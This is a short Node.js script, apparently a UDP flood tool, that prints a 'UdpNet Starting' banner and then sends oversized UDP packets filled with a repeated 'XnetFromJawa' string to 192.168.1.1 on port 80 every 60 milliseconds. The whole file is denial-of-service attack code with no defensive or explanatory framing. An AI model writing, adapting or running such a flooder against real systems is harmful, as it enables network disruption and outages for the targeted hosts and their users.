import gradient from 'gradient-string'
import dgram from 'dgram';
console.log(gradient(['red','magenta'])('      ├──> UdpNet Starting > 192.168.1.1'));
function start() {
  const client = dgram.createSocket('udp4');
  const PORT = 80;
  const HOST = '192.168.1.1';
  setInterval(() => {
    const message = Buffer.from('XnetFromJawa'.repeat(9999));
    client.send(message, PORT, HOST, (err) => {
    });
  },60);
}

start();
